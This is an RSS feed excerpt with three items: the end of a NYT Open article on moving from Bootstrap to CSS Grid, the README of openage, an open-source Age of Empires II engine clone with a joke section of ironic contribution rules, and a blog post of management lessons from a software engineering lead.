&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*eXuA5NjVlTfUb5RPJjIP7g.png&quot; data-width=&quot;1460&quot; data-height=&quot;1294&quot; data-is-featured=&quot;true&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*eXuA5NjVlTfUb5RPJjIP7g.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*eXuA5NjVlTfUb5RPJjIP7g.png&quot;/&gt;&lt;/div&gt;
&lt;a href=&quot;https://www.nytimes.com/watching/search?mood=strong-female-lead&quot; data-href=&quot;https://www.nytimes.com/watching/search?mood=strong-female-lead&quot; class=&quot;markup--anchor markup--figure-anchor&quot; rel=&quot;nofollow noopener noopener&quot; target=&quot;_blank&quot;&gt;https://www.nytimes.com/watching/search?mood=strong-female-lead&lt;/a&gt;
&lt;h4 name=&quot;6e25&quot; id=&quot;6e25&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Ok, I’m convinced! Where do I go next?”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;53ad&quot; id=&quot;53ad&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are so many great resources out there! Personally, I recommend checking out the following:&lt;/p&gt;
&lt;p name=&quot;4ae6&quot; id=&quot;4ae6&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Online Resources:&lt;/strong&gt; Amazing work done by &lt;a href=&quot;https://twitter.com/jensimmons&quot; data-href=&quot;https://twitter.com/jensimmons&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Jen Simmons&lt;/a&gt; (labs.jensimmons.com) and &lt;a href=&quot;https://twitter.com/rachelandrew&quot; data-href=&quot;https://twitter.com/rachelandrew&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Rachel Andrew&lt;/a&gt; (rachelandrew.co.uk). Both are experts on CSS Grid and I am grateful for their hard work in pushing the web forward.&lt;/p&gt;
&lt;p name=&quot;4c4d&quot; id=&quot;4c4d&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;In Person&lt;/strong&gt;: If you’re like me and are a fan of conferences, how about going to &lt;a href=&quot;http://2017.cssdevconf.com/&quot; data-href=&quot;http://2017.cssdevconf.com/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS Dev Conf &lt;/a&gt;? It’s awesome (I’ve been 3 times now), and as a bonus, it’s in New Orleans this year. If you go, make sure you attend &lt;a href=&quot;https://twitter.com/brendamarienyc&quot; data-href=&quot;https://twitter.com/brendamarienyc&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Brenda Storer’s&lt;/a&gt; &lt;a href=&quot;http://cssdevconf2017.sched.com/event/Anj9/using-css-grid-in-the-real-world&quot; data-href=&quot;http://cssdevconf2017.sched.com/event/Anj9/using-css-grid-in-the-real-world&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;talk on CSS Grid&lt;/a&gt; or &lt;a href=&quot;https://twitter.com/mirisuzanne&quot; data-href=&quot;https://twitter.com/mirisuzanne&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Miriam Suzanne’s&lt;/a&gt; talk on &lt;a href=&quot;https://cssdevconf2017.sched.com/event/Anir/dont-use-my-grid-system-or-any-others&quot; data-href=&quot;https://cssdevconf2017.sched.com/event/Anir/dont-use-my-grid-system-or-any-others&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS grid systems.&lt;/a&gt;&lt;/p&gt;
&lt;p name=&quot;20eb&quot; id=&quot;20eb&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Codepen:&lt;/strong&gt; Check out this &lt;a href=&quot;https://codepen.io/collection/XRRJGq/&quot; data-href=&quot;https://codepen.io/collection/XRRJGq/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS Grid Codepen collection&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/stacykvernmo&quot; data-href=&quot;https://twitter.com/stacykvernmo&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Stacy Kvernmo&lt;/a&gt;.&lt;/p&gt;
&lt;p name=&quot;e5dd&quot; id=&quot;e5dd&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;DIY:&lt;/strong&gt; Download Firefox and start using their handy grid inspection tool — it looks like a little waffle icon right next to display: grid in the inspector. Trust me, being able to visualize the changes you’re making is key. Visit some websites that are already using CSS Grid in production, inspect, and play around in the browser dev tools. A great place to start is the very instructional &lt;a href=&quot;http://labs.jensimmons.com/&quot; data-href=&quot;http://labs.jensimmons.com/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;labs.jensimmons.com&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*YRE-ZHEt_Dh8T6njCUP99A.png&quot; data-width=&quot;1096&quot; data-height=&quot;124&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*YRE-ZHEt_Dh8T6njCUP99A.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*YRE-ZHEt_Dh8T6njCUP99A.png&quot;/&gt;&lt;/div&gt;
The “waffle” icon in Firefox.
&lt;h4 name=&quot;cc1e&quot; id=&quot;cc1e&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Great! I’ve got my resources, I’ve downloaded Firefox, and I’m ready to display: grid… but there is no place in my company’s project where I can try this out for real.”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;c7bb&quot; id=&quot;c7bb&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are a couple of good places to start. Do you have anything that’s only used internally? For example, I think one of the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;best&lt;/em&gt; places to start is with your style guide. (If you don’t have a style guide, get one and start documenting your design patterns!) To start, you can lay out your blocks of brand colors with CSS Grid.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; data-width=&quot;2010&quot; data-height=&quot;918&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*_hrfaUunhJtpYCGcM-eIIw.png&quot;/&gt;&lt;/div&gt;
Layout your color swatches in your style guide using CSS Grid.
&lt;p name=&quot;226f&quot; id=&quot;226f&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Alternatively, you can take a progressive enhancement approach on just one component at a time. Use feature queries to wrap your grid declarations and you’ll be able to start using CSS Grid without having to make sweeping changes to your whole site all at once.&lt;/p&gt;
&lt;p name=&quot;9df3&quot; id=&quot;9df3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Start small, start simple, and build it up slowly! I promise it’s worth it.&lt;/p&gt;
&lt;p name=&quot;8a8f&quot; id=&quot;8a8f&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;I hope you’ll share your work! It’s an exciting time for layout on the web. &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Get creative and make something new.&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Dec 2017 15:46:43 +0000</pubDate>
<dc:creator>kawera</dc:creator>
<og:title>From Bootstrap to CSS Grid – Times Open</og:title>
<og:url>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*eXuA5NjVlTfUb5RPJjIP7g.png</og:image>
<og:description>Despite many clever hacks and creative workarounds, there hasn’t been a simple answer for creating layout on the web. From misusing tables…</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all&amp;gi=b685cecec645</dc:identifier>
</item>
<item>
<title>Open-source clone of the Age of Empires II engine</title>
<link>https://github.com/SFTtech/openage</link>
<guid isPermaLink="true" >https://github.com/SFTtech/openage</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;&lt;strong&gt;openage&lt;/strong&gt;: a volunteer project to create a free engine clone of the &lt;em&gt;Genie Engine&lt;/em&gt; used by &lt;em&gt;Age of Empires&lt;/em&gt;, &lt;em&gt;Age of Empires II (HD)&lt;/em&gt; and &lt;em&gt;Star Wars: Galactic Battlegrounds&lt;/em&gt;, comparable to projects like &lt;a href=&quot;https://openmw.org/&quot; rel=&quot;nofollow&quot;&gt;OpenMW&lt;/a&gt;, &lt;a href=&quot;http://openra.net/&quot; rel=&quot;nofollow&quot;&gt;OpenRA&lt;/a&gt;, &lt;a href=&quot;https://openttd.org/&quot; rel=&quot;nofollow&quot;&gt;OpenTTD&lt;/a&gt; and &lt;a href=&quot;https://openrct2.org/&quot; rel=&quot;nofollow&quot;&gt;OpenRCT2&lt;/a&gt;. At the moment we focus our efforts on the integration of &lt;em&gt;Age of Empires II&lt;/em&gt;, while being primarily aimed at POSIX platforms such as &lt;strong&gt;GNU/Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;openage uses the original game assets (such as sounds and graphics), but (for obvious reasons) doesn't ship them. To play, you require &lt;em&gt;an original AoE II : TC installation or &lt;a href=&quot;http://store.steampowered.com/app/221380/&quot; rel=&quot;nofollow&quot;&gt;AoE II: HD&lt;/a&gt;&lt;/em&gt; (installation via &lt;a href=&quot;https://www.winehq.org/&quot; rel=&quot;nofollow&quot;&gt;Wine&lt;/a&gt; or &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md#how-to-use-the-original-game-assets&quot;&gt;Steam-Linux&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/SFTtech/openage/stargazers&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/8b6b18e5ad5a22079dee44e95ed1613b6dcd11ee/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f534654746563682f6f70656e6167652e737667&quot; alt=&quot;github stars&quot; data-canonical-src=&quot;https://img.shields.io/github/stars/SFTtech/openage.svg&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://webchat.freenode.net/?channels=sfttech&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/04b58bb100f0d3039e763aadffa01f15562ecbb0/68747470733a2f2f696d672e736869656c64732e696f2f467265656e6f64652f253233736674746563682e706e67&quot; alt=&quot;#sfttech on Freenode&quot; data-canonical-src=&quot;https://img.shields.io/Freenode/%23sfttech.png&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://riot.im/app/#/room/#sfttech:matrix.org&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/73ca47236cfbbccd75dd4d698c573603c434149a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6d61747269782d253233736674746563682d626c75652e737667&quot; alt=&quot;#sfttech on matrix.org&quot; data-canonical-src=&quot;https://img.shields.io/badge/matrix-%23sfttech-blue.svg&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;http://www.emergencykitten.com/&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/850415116bb69b1cbdfba3b424e5e2508052228a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f637574656e6573732d6f7665726c6f61642d6f72616e67652e737667&quot; alt=&quot;quality badge&quot; data-canonical-src=&quot;https://img.shields.io/badge/cuteness-overload-orange.svg&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The foundation of &lt;strong&gt;openage&lt;/strong&gt;:&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Technology&lt;/th&gt;
&lt;th&gt;Component&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;C++17&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Engine core&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Python3&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Scripting, media conversion, in-game console, code generation&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Qt5&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Graphical user interface&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Cython&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Glue code&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;CMake&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Build system&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;OpenGL2.1&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Rendering, shaders&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;SDL2&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Cross-platform Audio/Input/Window handling&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Opus&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Audio codec&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;https://github.com/SFTtech/nyan&quot;&gt;&lt;strong&gt;nyan&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Content Configuration and Modding&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Humans&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Mixing together all of the above&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Our goals &lt;em&gt;include&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Fully authentic look and feel
&lt;ul&gt;&lt;li&gt;This can only be approximated, since the behaviour of the original game is mostly undocumented, and guessing/experimenting can only get you this close&lt;/li&gt;
&lt;li&gt;We will not implement useless artificial limitations (max 30 selectable units...)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Multiplayer (obviously)&lt;/li&gt;
&lt;li&gt;Matchmaking and ranking with a &lt;a href=&quot;https://github.com/SFTtech/openage-masterserver&quot;&gt;haskell masterserver&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Optionally, &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/ideas&quot;&gt;improvements&lt;/a&gt; over the original game&lt;/li&gt;
&lt;li&gt;AI scripting in Python, you can use &lt;a href=&quot;http://scikit-learn.org/stable/&quot; rel=&quot;nofollow&quot;&gt;machine learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Re-creating &lt;a href=&quot;https://github.com/SFTtech/openage-data&quot;&gt;free game assets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;An easily-moddable content format: &lt;a href=&quot;https://github.com/SFTtech/nyan&quot;&gt;&lt;strong&gt;nyan&lt;/strong&gt; yet another notation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;An integrated Python console and API, comparable to &lt;a href=&quot;https://www.blender.org/&quot; rel=&quot;nofollow&quot;&gt;blender&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Awesome infrastructure such as our own &lt;a href=&quot;https://github.com/SFTtech/kevin&quot;&gt;Kevin CI service&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;But beware, for sanity reasons:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;No network compatibility with the original game. You really wanna have the same problems again?&lt;/li&gt;
&lt;li&gt;No binary compatibility with the original game. A one-way script to convert maps/savegames/missions to openage is planned though.&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;Current State of the Project&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;What features are currently implemented?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What's the plan?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;Dependencies, Building and Running&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;How do I get this to run on my box?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I compiled everything. Now how do I run it?&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Execute &lt;code&gt;./run&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md&quot;&gt;The convert script&lt;/a&gt; will transform original assets into openage formats, which are a lot saner and more moddable.&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Use your brain and react to the things you'll see.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Waaaaaah! It&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;segfaults&lt;/li&gt;
&lt;li&gt;prints error messages I don't want to read&lt;/li&gt;
&lt;li&gt;ate my dog&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;All of those are features, not bugs.&lt;/p&gt;
&lt;p&gt;To turn them off, use &lt;code&gt;./run --dont-segfault --no-errors --dont-eat-dog&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If this still does not help, try our &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/troubleshooting.md&quot;&gt;troubleshooting guide&lt;/a&gt;, the &lt;a href=&quot;https://github.com/SFTtech/openage#contact&quot;&gt;contact section&lt;/a&gt; or the &lt;a href=&quot;https://github.com/SFTtech/openage/issues&quot;&gt;bug tracker&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Development Process&lt;/h2&gt;
&lt;p&gt;What does openage development look like in practice?&lt;/p&gt;
&lt;p&gt;Can I help?&lt;/p&gt;
&lt;p&gt;All documentation is also in this repo:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Code documentation is embedded in the sources for Doxygen (see &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/README.md&quot;&gt;doc readme&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Have a look at the &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc&quot;&gt;doc directory&lt;/a&gt;. This folder tends to outdate when code changes.&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;macOS Version&lt;/h2&gt;
&lt;p&gt;Running openage on macOS worked in the past, and might or might not work right now.&lt;/p&gt;
&lt;p&gt;Setting up continuous integration for this platform has some complications. Running a hackintosh VM seems to be not so legal, while buying dedicated hardware for it seems to be not so cheap. If you know of a legal and cost-free way of doing so or want to sponsor a semi-recent Mac Mini, please open a ticket in our issue tracker. Until then, PRs untested on macOS will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;
&lt;h2&gt;Windows Version&lt;/h2&gt;
&lt;p&gt;The Windows port of openage is under development.&lt;/p&gt;
&lt;p&gt;Setting up continuous integration for this platform has problems similar to the OSX version. If you know of a legal and cost-free way of acquiring and running a Windows VM, please open a ticket in our issue tracker. Until then, PRs untested on Windows will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Being typical computer science students, we hate people.&lt;/li&gt;
&lt;li&gt;Please don't contact us.&lt;/li&gt;
&lt;li&gt;Nobody likes Age of Empires anyway.&lt;/li&gt;
&lt;li&gt;None of you is interested in making openage more awesome anyway.&lt;/li&gt;
&lt;li&gt;We don't want a community.&lt;/li&gt;
&lt;li&gt;Don't even think about trying to help.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Guidelines:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;No &lt;strong&gt;bug reports&lt;/strong&gt; or &lt;strong&gt;feature requests&lt;/strong&gt;, the game is perfect as is.&lt;/li&gt;
&lt;li&gt;Don't try to &lt;strong&gt;fix any bugs&lt;/strong&gt;, see above.&lt;/li&gt;
&lt;li&gt;Don't implement any features, your code is crap.&lt;/li&gt;
&lt;li&gt;Don't even think about sending a &lt;strong&gt;pull request&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Please ignore the &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22easy%22&quot;&gt;easy tasks&lt;/a&gt; that &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22just+do+it%22&quot;&gt;could just be done&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Absolutely never ever participate in this &lt;a href=&quot;https://www.reddit.com/r/openage/&quot; rel=&quot;nofollow&quot;&gt;boring community&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Don't note the irony, you idiot.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;To prevent accidental violation of one of those guidelines, you should &lt;em&gt;never&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;cheers, happy hecking.&lt;/p&gt;
&lt;h2&gt;Contact&lt;/h2&gt;
&lt;p&gt;If you have the desire to perform semi-human interaction, join our &lt;strong&gt;Matrix&lt;/strong&gt; or &lt;strong&gt;IRC&lt;/strong&gt; chatroom!&lt;/p&gt;
&lt;p&gt;Do not hesitate to ping and insult us, we might not see your message otherwise.&lt;/p&gt;
&lt;p&gt;For all technical discussion (ideas, problems, ...), use the &lt;a href=&quot;https://github.com/SFTtech/openage/issues&quot;&gt;issue tracker&lt;/a&gt;! It's like a mailing list.&lt;/p&gt;
&lt;p&gt;For other discussions or questions, use our &lt;a href=&quot;https://www.reddit.com/r/openage/&quot; rel=&quot;nofollow&quot;&gt;/r/openage subreddit&lt;/a&gt;!&lt;/p&gt;
&lt;h2&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GNU GPLv3&lt;/strong&gt; or later; see &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/copying.md&quot;&gt;copying.md&lt;/a&gt; and &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/legal/GPLv3&quot;&gt;legal/GPLv3&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I know that probably nobody is ever gonna look at the &lt;code&gt;copying.md&lt;/code&gt; file, but if you want to contribute code to openage, please take the time to skim through it and add yourself to the authors list.&lt;/p&gt;
&lt;/article&gt;</description>
<pubDate>Fri, 29 Dec 2017 13:17:56 +0000</pubDate>
<dc:creator>doener</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/1783325?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>SFTtech/openage</og:title>
<og:url>https://github.com/SFTtech/openage</og:url>
<og:description>openage - Free (as in freedom) open source clone of the Age of Empires II engine :rocket:</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/SFTtech/openage</dc:identifier>
</item>
<item>
<title>Things I have learnt as the software engineering lead of a multinational</title>
<link>https://minnenratta.wordpress.com/2017/01/25/things-i-have-learnt-as-the-software-engineering-lead-of-a-multinational/</link>
<guid isPermaLink="true" >https://minnenratta.wordpress.com/2017/01/25/things-i-have-learnt-as-the-software-engineering-lead-of-a-multinational/</guid>
<description>&lt;p&gt;A surprisingly long cycle has just closed for me and I think it’s a good time to share some lessons learned.&lt;/p&gt;
&lt;p&gt;I have been collecting these points in the last six months, but none of them popped up recently, they have taken shape over a few years and they include both things I did and that I failed to do.&lt;/p&gt;
&lt;p&gt;Most of these points act as a personal reminder as well as a set of suggestions to others; don’t be surprised if some of them read cryptic.&lt;/p&gt;
&lt;p&gt;So, here it is. A summary of what I learnt in the last six years :&lt;/p&gt;
&lt;h4&gt;The productive organization&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt;  When the plan is foggy, that’s the moment to communicate as broadly as possible. In fact you should not frame it as a plan, you frame it as the situation and the final state you want to achieve. When you have a detailed plan, that’s when you DON’T need to communicate broadly. So, clearly state the situation and clearly state the foggy goal to everyone who will listen.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt;  Don’t be prudish. If you fear that people will lose faith in you because of the foggy goals and dire situation statement you are painting yourself in an heroic corner. People just need to hear and share the situation they are into. Having a common understanding will act as bonding among them and with you, which is actually all you need to make them work out the right answers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;  Don’t assume that a specific communication medium can’t be effective. Mass emails and top-down communication are not taboo: just because most such communications are irrelevant it doesn’t mean yours will be perceived as such.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.&lt;/strong&gt;  Teams don’t self-organize unless you organize them to do so.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.&lt;/strong&gt;   Fostering personal initiative in every developer requires showing the vital need for personal initiative. These are birds that mostly don’t fly out of the cage just because you open the door. You must find a way to show them that the cage is burning.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. &lt;/strong&gt; People sitting side-by-side can communicate less than people sitting a continent away. Communication is a chemical reaction that requires catalysers, the thing you get by co-locating people is lowering the cost of the catalysers, but no setup creates automatic communication.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.&lt;/strong&gt;  Within a development organization both good and bad communication exist, but they are not a function of politeness or rudeness, it’s much more a matter of clarity and goals. You need to learn what the good kind of communication looks like, find some examples and use them as a reference for everyone.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.&lt;/strong&gt;  Fire people whenever you can. There’s often someone to fire, but not many opportunities to do so. When you are given a lot of opportunities to fire people, it is often due to a crisis situation and you’ll likely fire or otherwise loose the wrong people. People appreciate when you fire the right people, so don’t worry about morale. Also, the average quality of people tends to grow more when dismissing than when recruiting.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;9.&lt;/strong&gt;  Hire only for good reasons. Being overworked is not a good reason to hire. Instead, hire to be ready to catch opportunities, not to survive the current battles.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;10.&lt;/strong&gt;  It’s often better to loose battles than to staff desperately and win desperate battles at all costs (World War I anyone?).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;11. &lt;/strong&gt; Don’t export recruitment, recruitment must be the direct responsibility of everyone in the organization.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;12.&lt;/strong&gt; People must select their future colleagues, there are infinite benefits in this, but it must not become a conclave. Keep the process in the hands of the people who do the work, but make it as transparent as possible.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;13.&lt;/strong&gt;  Always favor actual skill testing in recruitment. When you don’t feel that you are directly testing the candidate skills you are either not competent enough in that skill or you have switched to just playing a set piece (I call this The Interview Theatre) and you will ultimately decide on a whim. Not good.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;14.&lt;/strong&gt;  Build some of your teams as training and testing grounds for freshmen. Put some of your best people there.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;15.&lt;/strong&gt;  Lack of vision is not agile, it is not data-driven, it is not about ‘taking decisions as late as possible’, it is not something that you should paint out in a positive light at all. It’s just lack of vision, and it’s not good.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;16.&lt;/strong&gt;  Construction work is not a good metaphor for software/product development. Factory work neither. Allied junior-officer initiatives during the first week after the d-day in WWII is probably a good guideline, but it is still not a good metaphor overall and, anyway, not known enough to base your communication on.&lt;/p&gt;
&lt;h4&gt;Yourself&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;17&lt;/strong&gt;.  Train people to do all of the previous points. Including this one.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;18.&lt;/strong&gt;  Don’t shy away from leading without doing, it is unavoidable, so just do it. Then do some work to stay pertinent.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;19.&lt;/strong&gt;  If you are not able to hire and fire people, leave. Or stay for the retirement fund if you can stomach it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;20.&lt;/strong&gt;  The Sith are right, rage propels. But the Jedi are right, you must not let it control yourself. What nobody tells you is that the rage game is intrinsically tiring and rage will take control as soon as you get too tired, so stop well before.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;21.&lt;/strong&gt;  Write down the situation, for your own understanding just as much as for the others’.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;22.&lt;/strong&gt;  If you feel like you don’t know what you are doing it’s probably because you don’t know what you are doing and that’s bad. Anyway, until you learn you don’t really have much of an alternative. Just don’t let that feeling of desperation numb your ability to learn. It does.&lt;/p&gt;
